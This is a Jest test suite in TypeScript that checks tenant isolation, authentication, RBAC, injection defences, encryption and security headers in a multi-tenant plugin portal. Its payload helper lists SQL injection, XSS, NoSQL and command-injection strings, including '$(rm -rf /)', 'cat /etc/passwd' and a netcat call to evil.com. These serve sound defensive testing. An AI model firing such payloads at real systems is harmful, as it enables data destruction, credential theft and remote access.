/**
 * Security Testing Suite for Multi-tenant Isolation
 * Tests tenant isolation, authentication, authorization, and data security
 */

import { describe, expect, it, beforeAll, afterAll, beforeEach, afterEach } from '@jest/globals';
import { PrismaClient } from '@prisma/client';
import Redis from 'ioredis';
import axios, { AxiosInstance } from 'axios';
import crypto from 'crypto';
import jwt from 'jsonwebtoken';

// Security test configuration
const SECURITY_CONFIG = {
  apiUrl: process.env.TEST_API_URL || 'http://localhost:4400',
  redisUrl: process.env.TEST_REDIS_URL || 'redis://localhost:6379',
  postgresUrl: process.env.TEST_DATABASE_URL || 'postgresql://postgres:postgres@localhost:5432/nextportal_test',
  jwtSecret: process.env.JWT_SECRET || 'test-secret',
  timeout: 30000,
};

interface TestTenant {
  id: string;
  name: string;
  domain: string;
  adminUserId: string;
  userUserId: string;
  adminToken: string;
  userToken: string;
}

interface SecurityTestContext {
  prisma: PrismaClient;
  redis: Redis;
  api: AxiosInstance;
  tenants: TestTenant[];
  maliciousPayloads: Record<string, any>;
}

describe('Multi-tenant Security Testing Suite', () => {
  let context: SecurityTestContext;

  beforeAll(async () => {
    // Initialize test context
    context = await initializeSecurityTestContext();
    
    // Create test tenants with different security configurations
    await createTestTenants();
    
    // Prepare malicious payloads for injection testing
    prepareMaliciousPayloads();
  }, 60000);

  afterAll(async () => {
    await cleanupSecurityTestContext();
  }, 30000);

  beforeEach(async () => {
    // Reset any test data between tests
    await resetTestData();
  });

  afterEach(async () => {
    // Verify no security violations occurred
    await verifySecurityIntegrity();
  });

  describe('Authentication Security', () => {
    it('should prevent brute force attacks on login endpoint', async () => {
      const { api, tenants } = context;
      const targetTenant = tenants[0];
      
      // Attempt multiple failed logins rapidly
      const failedAttempts = 15;
      const promises = [];
      
      for (let i = 0; i < failedAttempts; i++) {
        promises.push(
          api.post('/api/auth/login', {
            email: `admin@${targetTenant.domain}`,
            password: 'wrong-password',
          }).catch(err => err.response)
        );
      }
      
      const responses = await Promise.all(promises);
      
      // Should get rate limited after several attempts
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
      
      // Should include proper rate limit headers
      const rateLimitResponse = rateLimitedResponses[0];
      expect(rateLimitResponse.headers['retry-after']).toBeDefined();
      expect(rateLimitResponse.headers['x-ratelimit-remaining']).toBeDefined();
    });

    it('should enforce secure password requirements', async () => {
      const { api, tenants } = context;
      const tenant = tenants[0];
      
      const weakPasswords = [
        '123',
        'password',
        '12345678',
        'admin',
        'qwerty',
        'abc123',
      ];
      
      for (const weakPassword of weakPasswords) {
        const response = await api.post('/api/auth/register', {
          email: `newuser@${tenant.domain}`,
          password: weakPassword,
          name: 'New User',
        }, {
          headers: { 'X-Tenant-Domain': tenant.domain },
        }).catch(err => err.response);
        
        expect(response.status).toBe(400);
        expect(response.data.error).toContain('Password requirements');
      }
    });

    it('should validate JWT tokens properly', async () => {
      const { api, tenants } = context;
      const tenant = tenants[0];
      
      // Test with invalid tokens
      const invalidTokens = [
        'invalid.jwt.token',
        jwt.sign({ userId: 'fake' }, 'wrong-secret'),
        jwt.sign({ userId: tenant.adminUserId }, SECURITY_CONFIG.jwtSecret, { expiresIn: '-1h' }), // Expired
        '',
        'Bearer malformed-token',
      ];
      
      for (const token of invalidTokens) {
        const response = await api.get('/api/auth/me', {
          headers: { Authorization: `Bearer ${token}` },
        }).catch(err => err.response);
        
        expect([401, 403]).toContain(response.status);
      }
    });

    it('should prevent session fixation attacks', async () => {
      const { api, tenants } = context;
      const tenant = tenants[0];
      
      // Login and get session token
      const loginResponse = await api.post('/api/auth/login', {
        email: `admin@${tenant.domain}`,
        password: 'testpassword',
      });
      
      const originalToken = loginResponse.data.token;
      
      // Perform sensitive operation
      await api.post('/api/plugins', {
        action: 'install',
        pluginId: '@backstage/plugin-catalog',
      }, {
        headers: { Authorization: `Bearer ${originalToken}` },
      });
      
      // Login again - should get new token
      const secondLoginResponse = await api.post('/api/auth/login', {
        email: `admin@${tenant.domain}`,
        password: 'testpassword',
      });
      
      const newToken = secondLoginResponse.data.token;
      
      // Tokens should be different
      expect(newToken).not.toBe(originalToken);
      
      // Old token should be invalidated
      const oldTokenResponse = await api.get('/api/auth/me', {
        headers: { Authorization: `Bearer ${originalToken}` },
      }).catch(err => err.response);
      
      expect(oldTokenResponse.status).toBe(401);
    });
  });

  describe('Multi-tenant Data Isolation', () => {
    it('should prevent cross-tenant data access via API manipulation', async () => {
      const { api, tenants } = context;
      const tenant1 = tenants[0];
      const tenant2 = tenants[1];
      
      // Install plugin for tenant 1
      await api.post('/api/plugins', {
        action: 'install',
        pluginId: '@backstage/plugin-kubernetes',
        config: { secretData: 'tenant1-secret' },
      }, {
        headers: { Authorization: `Bearer ${tenant1.adminToken}` },
      });
      
      // Try to access tenant 1's data using tenant 2's token with manipulated headers
      const crossTenantAttempts = [
        // Header manipulation
        {
          headers: { 
            Authorization: `Bearer ${tenant2.adminToken}`,
            'X-Tenant-ID': tenant1.id,
          },
        },
        // URL manipulation
        {
          headers: { Authorization: `Bearer ${tenant2.adminToken}` },
          params: { tenantId: tenant1.id },
        },
        // Body manipulation
        {
          headers: { Authorization: `Bearer ${tenant2.adminToken}` },
          data: { tenantId: tenant1.id },
        },
      ];
      
      for (const attempt of crossTenantAttempts) {
        const response = await api.get('/api/plugins/status', attempt)
          .catch(err => err.response);
        
        // Should deny access
        expect([401, 403]).toContain(response.status);
        
        // Should not leak tenant 1's data
        if (response.data) {
          expect(JSON.stringify(response.data)).not.toContain('tenant1-secret');
        }
      }
    });

    it('should enforce database-level tenant isolation', async () => {
      const { prisma, tenants } = context;
      const tenant1 = tenants[0];
      const tenant2 = tenants[1];
      
      // Create plugin installation for tenant 1
      await prisma.pluginInstallation.create({
        data: {
          pluginId: '@test/isolation-test-plugin',
          tenantId: tenant1.id,
          version: '1.0.0',
          status: 'installed',
          config: { sensitiveData: 'tenant1-only-data' },
        },
      });
      
      // Try to access from tenant 2's context
      const crossTenantQuery = await prisma.pluginInstallation.findMany({
        where: {
          pluginId: '@test/isolation-test-plugin',
          // Simulate compromised query that tries to bypass tenant filtering
        },
      });
      
      // Should not return tenant 1's data
      const tenant1Data = crossTenantQuery.filter(p => p.tenantId === tenant1.id);
      expect(tenant1Data).toHaveLength(0);
      
      // Verify row-level security if implemented
      const directQuery = await prisma.$queryRaw`
        SELECT * FROM "PluginInstallation" 
        WHERE "pluginId" = '@test/isolation-test-plugin'
      `;
      
      // Should respect tenant isolation even in raw queries
      expect(directQuery).toEqual([]);
    });

    it('should prevent tenant data leakage through Redis cache', async () => {
      const { redis, api, tenants } = context;
      const tenant1 = tenants[0];
      const tenant2 = tenants[1];
      
      // Create cached data for tenant 1
      const cacheKey1 = `plugins:${tenant1.id}:installed`;
      await redis.setex(cacheKey1, 3600, JSON.stringify({
        plugins: [{ id: 'secret-plugin', config: { secret: 'tenant1-secret' } }],
      }));
      
      // Try to access via tenant 2's session
      const response = await api.get('/api/plugins?status=installed', {
        headers: { Authorization: `Bearer ${tenant2.adminToken}` },
      });
      
      expect(response.status).toBe(200);
      
      // Should not contain tenant 1's cached data
      const responseData = JSON.stringify(response.data);
      expect(responseData).not.toContain('tenant1-secret');
      expect(responseData).not.toContain('secret-plugin');
      
      // Verify cache keys are tenant-specific
      const tenant2CacheKey = `plugins:${tenant2.id}:installed`;
      const cachedData = await redis.get(tenant2CacheKey);
      
      if (cachedData) {
        expect(cachedData).not.toContain('tenant1-secret');
      }
    });

    it('should isolate plugin configurations between tenants', async () => {
      const { api, tenants } = context;
      const tenant1 = tenants[0];
      const tenant2 = tenants[1];
      
      const pluginId = '@backstage/plugin-catalog';
      
      // Configure plugin for tenant 1 with sensitive data
      await api.post('/api/plugins', {
        action: 'configure',
        pluginId,
        config: {
          apiUrl: 'https://tenant1-private-api.com',
          secretKey: 'tenant1-secret-key-12345',
          environment: 'tenant1-production',
        },
      }, {
        headers: { Authorization: `Bearer ${tenant1.adminToken}` },
      });
      
      // Configure plugin for tenant 2
      await api.post('/api/plugins', {
        action: 'configure',
        pluginId,
        config: {
          apiUrl: 'https://tenant2-private-api.com',
          secretKey: 'tenant2-secret-key-67890',
          environment: 'tenant2-production',
        },
      }, {
        headers: { Authorization: `Bearer ${tenant2.adminToken}` },
      });
      
      // Verify tenant 1 can only see their config
      const tenant1Config = await api.get('/api/plugins/status', {
        headers: { Authorization: `Bearer ${tenant1.adminToken}` },
        params: { pluginId },
      });
      
      expect(tenant1Config.data.config.secretKey).toBe('tenant1-secret-key-12345');
      expect(tenant1Config.data.config.apiUrl).toContain('tenant1');
      
      // Verify tenant 2 can only see their config
      const tenant2Config = await api.get('/api/plugins/status', {
        headers: { Authorization: `Bearer ${tenant2.adminToken}` },
        params: { pluginId },
      });
      
      expect(tenant2Config.data.config.secretKey).toBe('tenant2-secret-key-67890');
      expect(tenant2Config.data.config.apiUrl).toContain('tenant2');
      
      // Verify no cross-contamination
      expect(tenant1Config.data.config.secretKey).not.toBe(tenant2Config.data.config.secretKey);
    });
  });

  describe('Input Validation and Injection Prevention', () => {
    it('should prevent SQL injection attacks', async () => {
      const { api, tenants, maliciousPayloads } = context;
      const tenant = tenants[0];
      
      const sqlInjectionPayloads = maliciousPayloads.sqlInjection;
      
      for (const payload of sqlInjectionPayloads) {
        // Test in search parameters
        const searchResponse = await api.get('/api/plugins', {
          headers: { Authorization: `Bearer ${tenant.adminToken}` },
          params: { search: payload },
        }).catch(err => err.response);
        
        expect(searchResponse.status).toBe(200);
        
        // Should not contain SQL error messages
        const responseText = JSON.stringify(searchResponse.data);
        expect(responseText).not.toMatch(/syntax error|sql|postgresql|relation.*does not exist/i);
        
        // Test in plugin configuration
        const configResponse = await api.post('/api/plugins', {
          action: 'configure',
          pluginId: '@backstage/plugin-catalog',
          config: { name: payload },
        }, {
          headers: { Authorization: `Bearer ${tenant.adminToken}` },
        }).catch(err => err.response);
        
        // Should either succeed with sanitized input or fail validation
        if (configResponse.status === 200) {
          expect(configResponse.data.success).toBe(true);
        } else {
          expect(configResponse.status).toBe(400);
        }
      }
    });

    it('should prevent XSS attacks', async () => {
      const { api, tenants, maliciousPayloads } = context;
      const tenant = tenants[0];
      
      const xssPayloads = maliciousPayloads.xss;
      
      for (const payload of xssPayloads) {
        // Test in plugin description/metadata
        const response = await api.post('/api/plugins', {
          action: 'configure',
          pluginId: '@backstage/plugin-catalog',
          config: {
            displayName: payload,
            description: payload,
          },
        }, {
          headers: { Authorization: `Bearer ${tenant.adminToken}` },
        }).catch(err => err.response);
        
        if (response.status === 200) {
          // Verify XSS payload was sanitized
          const statusResponse = await api.get('/api/plugins/status', {
            headers: { Authorization: `Bearer ${tenant.adminToken}` },
            params: { pluginId: '@backstage/plugin-catalog' },
          });
          
          const config = statusResponse.data.config;
          expect(config.displayName || '').not.toMatch(/<script|javascript:|onerror=/i);
          expect(config.description || '').not.toMatch(/<script|javascript:|onerror=/i);
        }
      }
    });

    it('should prevent NoSQL injection attacks', async () => {
      const { api, tenants, maliciousPayloads } = context;
      const tenant = tenants[0];
      
      const noSqlPayloads = maliciousPayloads.noSqlInjection;
      
      for (const payload of noSqlPayloads) {
        const response = await api.get('/api/plugins', {
          headers: { Authorization: `Bearer ${tenant.adminToken}` },
          params: { 
            category: payload,
            sortBy: payload,
          },
        }).catch(err => err.response);
        
        // Should handle malicious input gracefully
        expect([200, 400]).toContain(response.status);
        
        if (response.status === 200) {
          // Should not return unexpected data structure
          expect(response.data).toHaveProperty('plugins');
          expect(Array.isArray(response.data.plugins)).toBe(true);
        }
      }
    });

    it('should prevent command injection attacks', async () => {
      const { api, tenants, maliciousPayloads } = context;
      const tenant = tenants[0];
      
      const commandInjectionPayloads = maliciousPayloads.commandInjection;
      
      for (const payload of commandInjectionPayloads) {
        const response = await api.post('/api/plugins', {
          action: 'install',
          pluginId: payload,
          version: '1.0.0',
        }, {
          headers: { Authorization: `Bearer ${tenant.adminToken}` },
        }).catch(err => err.response);
        
        // Should reject malicious plugin IDs
        expect([400, 422]).toContain(response.status);
        expect(response.data.error).toMatch(/invalid|forbidden|malformed/i);
      }
    });
  });

  describe('Authorization and Access Control', () => {
    it('should enforce role-based access control (RBAC)', async () => {
      const { api, tenants } = context;
      const tenant = tenants[0];
      
      // Admin should have full access
      const adminResponse = await api.post('/api/plugins', {
        action: 'install',
        pluginId: '@backstage/plugin-catalog',
      }, {
        headers: { Authorization: `Bearer ${tenant.adminToken}` },
      });
      
      expect(adminResponse.status).toBe(200);
      
      // Regular user should have limited access
      const userResponse = await api.post('/api/admin/tenants', {
        name: 'Unauthorized Tenant',
        domain: 'unauthorized.com',
      }, {
        headers: { Authorization: `Bearer ${tenant.userToken}` },
      }).catch(err => err.response);
      
      expect(userResponse.status).toBe(403);
      expect(userResponse.data.error).toContain('permission');
    });

    it('should prevent privilege escalation', async () => {
      const { api, tenants } = context;
      const tenant = tenants[0];
      
      // User attempts to modify their own role
      const escalationAttempts = [
        {
          endpoint: '/api/auth/me',
          method: 'PATCH',
          data: { role: 'admin' },
        },
        {
          endpoint: '/api/users/profile',
          method: 'PUT',
          data: { role: 'super-admin', permissions: ['*'] },
        },
      ];
      
      for (const attempt of escalationAttempts) {
        const response = await api.request({
          method: attempt.method,
          url: attempt.endpoint,
          data: attempt.data,
          headers: { Authorization: `Bearer ${tenant.userToken}` },
        }).catch(err => err.response);
        
        // Should deny privilege escalation
        expect([400, 403, 422]).toContain(response.status);
      }
      
      // Verify user role wasn't changed
      const userProfile = await api.get('/api/auth/me', {
        headers: { Authorization: `Bearer ${tenant.userToken}` },
      });
      
      expect(userProfile.data.user.role).toBe('user');
    });

    it('should enforce API rate limiting per tenant', async () => {
      const { api, tenants } = context;
      const tenant = tenants[0];
      
      // Make rapid requests to trigger rate limiting
      const requests = Array.from({ length: 100 }, () =>
        api.get('/api/plugins', {
          headers: { Authorization: `Bearer ${tenant.adminToken}` },
        }).catch(err => err.response)
      );
      
      const responses = await Promise.all(requests);
      
      // Should have some rate-limited responses
      const rateLimited = responses.filter(r => r.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
      
      // Rate limiting should be per-tenant
      const anotherTenantRequests = Array.from({ length: 10 }, () =>
        api.get('/api/plugins', {
          headers: { Authorization: `Bearer ${tenants[1].adminToken}` },
        })
      );
      
      const anotherTenantResponses = await Promise.all(anotherTenantRequests);
      
      // Other tenant should not be affected by first tenant's rate limiting
      const successfulResponses = anotherTenantResponses.filter(r => r.status === 200);
      expect(successfulResponses.length).toBeGreaterThan(5);
    });
  });

  describe('Data Encryption and Security', () => {
    it('should encrypt sensitive configuration data', async () => {
      const { prisma, api, tenants } = context;
      const tenant = tenants[0];
      
      const sensitiveConfig = {
        apiKey: 'sk-1234567890abcdef',
        secret: 'top-secret-value',
        password: 'super-secure-password',
      };
      
      // Configure plugin with sensitive data
      await api.post('/api/plugins', {
        action: 'configure',
        pluginId: '@backstage/plugin-catalog',
        config: sensitiveConfig,
      }, {
        headers: { Authorization: `Bearer ${tenant.adminToken}` },
      });
      
      // Check database - sensitive fields should be encrypted
      const installation = await prisma.pluginInstallation.findFirst({
        where: {
          pluginId: '@backstage/plugin-catalog',
          tenantId: tenant.id,
        },
      });
      
      const configJson = JSON.stringify(installation?.config);
      
      // Sensitive values should not appear in plaintext
      expect(configJson).not.toContain('sk-1234567890abcdef');
      expect(configJson).not.toContain('top-secret-value');
      expect(configJson).not.toContain('super-secure-password');
      
      // Should contain encrypted/hashed values instead
      expect(configJson).toMatch(/\$[a-z0-9]+\$|[a-f0-9]{32,}/); // Hash patterns
    });

    it('should securely handle webhook signatures', async () => {
      const { api, tenants } = context;
      const tenant = tenants[0];
      
      const webhookPayload = { type: 'plugin-update', data: { pluginId: 'test' } };
      const secret = 'webhook-secret-key';
      const timestamp = Date.now().toString();
      
      // Generate valid signature
      const validSignature = crypto
        .createHmac('sha256', secret)
        .update(timestamp + JSON.stringify(webhookPayload))
        .digest('hex');
      
      // Test with valid signature
      const validResponse = await api.post('/api/webhooks/github', webhookPayload, {
        headers: {
          'X-Hub-Signature-256': `sha256=${validSignature}`,
          'X-Hub-Timestamp': timestamp,
          'X-Tenant-ID': tenant.id,
        },
      });
      
      expect([200, 202]).toContain(validResponse.status);
      
      // Test with invalid signature
      const invalidResponse = await api.post('/api/webhooks/github', webhookPayload, {
        headers: {
          'X-Hub-Signature-256': 'sha256=invalid-signature',
          'X-Hub-Timestamp': timestamp,
          'X-Tenant-ID': tenant.id,
        },
      }).catch(err => err.response);
      
      expect([401, 403]).toContain(invalidResponse.status);
    });

    it('should prevent timing attacks on authentication', async () => {
      const { api, tenants } = context;
      const tenant = tenants[0];
      
      const validEmail = `admin@${tenant.domain}`;
      const invalidEmail = 'nonexistent@invalid.com';
      const wrongPassword = 'wrong-password';
      
      // Measure response times for valid vs invalid emails
      const timings: number[] = [];
      
      // Test with valid email, wrong password
      for (let i = 0; i < 5; i++) {
        const start = Date.now();
        await api.post('/api/auth/login', {
          email: validEmail,
          password: wrongPassword,
        }).catch(() => {});
        timings.push(Date.now() - start);
      }
      
      // Test with invalid email
      for (let i = 0; i < 5; i++) {
        const start = Date.now();
        await api.post('/api/auth/login', {
          email: invalidEmail,
          password: wrongPassword,
        }).catch(() => {});
        timings.push(Date.now() - start);
      }
      
      // Response times should be similar to prevent user enumeration
      const avgValidEmailTime = timings.slice(0, 5).reduce((a, b) => a + b) / 5;
      const avgInvalidEmailTime = timings.slice(5).reduce((a, b) => a + b) / 5;
      const timeDifference = Math.abs(avgValidEmailTime - avgInvalidEmailTime);
      
      // Timing difference should be minimal (within 50ms)
      expect(timeDifference).toBeLessThan(50);
    });
  });

  describe('Security Headers and CORS', () => {
    it('should include proper security headers', async () => {
      const { api } = context;
      
      const response = await api.get('/api/plugins');
      
      // Check for security headers
      const headers = response.headers;
      
      expect(headers['x-frame-options']).toBe('DENY');
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['x-xss-protection']).toBe('1; mode=block');
      expect(headers['strict-transport-security']).toContain('max-age');
      expect(headers['content-security-policy']).toBeDefined();
      expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
    });

    it('should enforce proper CORS policies', async () => {
      const { api } = context;
      
      // Test CORS preflight request
      const corsResponse = await api.request({
        method: 'OPTIONS',
        url: '/api/plugins',
        headers: {
          'Origin': 'https://evil-site.com',
          'Access-Control-Request-Method': 'GET',
          'Access-Control-Request-Headers': 'Authorization',
        },
      }).catch(err => err.response);
      
      // Should reject unauthorized origins
      expect(corsResponse.status).toBe(405);
      
      // Test with authorized origin
      const validCorsResponse = await api.request({
        method: 'OPTIONS',
        url: '/api/plugins',
        headers: {
          'Origin': 'https://app.example.com',
          'Access-Control-Request-Method': 'GET',
        },
      });
      
      expect(validCorsResponse.status).toBe(200);
      expect(validCorsResponse.headers['access-control-allow-origin']).toBeTruthy();
    });
  });

  // Helper functions
  async function initializeSecurityTestContext(): Promise<SecurityTestContext> {
    const prisma = new PrismaClient({
      datasources: { db: { url: SECURITY_CONFIG.postgresUrl } },
    });
    
    const redis = new Redis(SECURITY_CONFIG.redisUrl);
    
    const api = axios.create({
      baseURL: SECURITY_CONFIG.apiUrl,
      timeout: SECURITY_CONFIG.timeout,
      validateStatus: () => true, // Don't throw on HTTP errors
    });
    
    return {
      prisma,
      redis,
      api,
      tenants: [],
      maliciousPayloads: {},
    };
  }

  async function createTestTenants(): Promise<void> {
    const { prisma, api } = context;
    
    for (let i = 0; i < 3; i++) {
      const tenantData = {
        name: `Security Test Tenant ${i + 1}`,
        domain: `security-test-${i + 1}.com`,
        isActive: true,
      };
      
      // Create tenant
      const tenant = await prisma.tenant.create({ data: tenantData });
      
      // Create admin user
      const adminUser = await prisma.user.create({
        data: {
          email: `admin@${tenantData.domain}`,
          name: `Admin User ${i + 1}`,
          tenantId: tenant.id,
          role: 'admin',
          isActive: true,
        },
      });
      
      // Create regular user
      const regularUser = await prisma.user.create({
        data: {
          email: `user@${tenantData.domain}`,
          name: `Regular User ${i + 1}`,
          tenantId: tenant.id,
          role: 'user',
          isActive: true,
        },
      });
      
      // Get auth tokens
      const adminLoginResponse = await api.post('/api/auth/login', {
        email: `admin@${tenantData.domain}`,
        password: 'testpassword',
      });
      
      const userLoginResponse = await api.post('/api/auth/login', {
        email: `user@${tenantData.domain}`,
        password: 'testpassword',
      });
      
      context.tenants.push({
        id: tenant.id,
        name: tenant.name,
        domain: tenant.domain,
        adminUserId: adminUser.id,
        userUserId: regularUser.id,
        adminToken: adminLoginResponse.data.token,
        userToken: userLoginResponse.data.token,
      });
    }
  }

  function prepareMaliciousPayloads(): void {
    context.maliciousPayloads = {
      sqlInjection: [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM users--",
        "'; DELETE FROM plugins; --",
      ],
      xss: [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
      ],
      noSqlInjection: [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$where": "function() { return true; }"}',
        '{"$regex": ".*"}',
      ],
      commandInjection: [
        '; cat /etc/passwd',
        '`whoami`',
        '$(rm -rf /)',
        '| nc evil.com 1234',
        '&& curl evil.com',
      ],
    };
  }

  async function resetTestData(): Promise<void> {
    // Clean up any test installations
    await context.prisma.pluginInstallation.deleteMany({
      where: {
        tenantId: { in: context.tenants.map(t => t.id) },
      },
    });
    
    // Clear Redis cache
    await context.redis.flushdb();
  }

  async function verifySecurityIntegrity(): Promise<void> {
    // Check for any security violations that might have occurred
    const { prisma, tenants } = context;
    
    // Verify no cross-tenant data leaks
    for (const tenant of tenants) {
      const installations = await prisma.pluginInstallation.findMany({
        where: { tenantId: tenant.id },
      });
      
      // All installations should belong to this tenant
      installations.forEach(installation => {
        expect(installation.tenantId).toBe(tenant.id);
      });
    }
  }

  async function cleanupSecurityTestContext(): Promise<void> {
    const { prisma, redis, tenants } = context;
    
    // Clean up test data
    for (const tenant of tenants) {
      await prisma.pluginInstallation.deleteMany({
        where: { tenantId: tenant.id },
      });
      await prisma.user.deleteMany({
        where: { tenantId: tenant.id },
      });
      await prisma.tenant.delete({
        where: { id: tenant.id },
      });
    }
    
    // Close connections
    await prisma.$disconnect();
    await redis.quit();
  }
});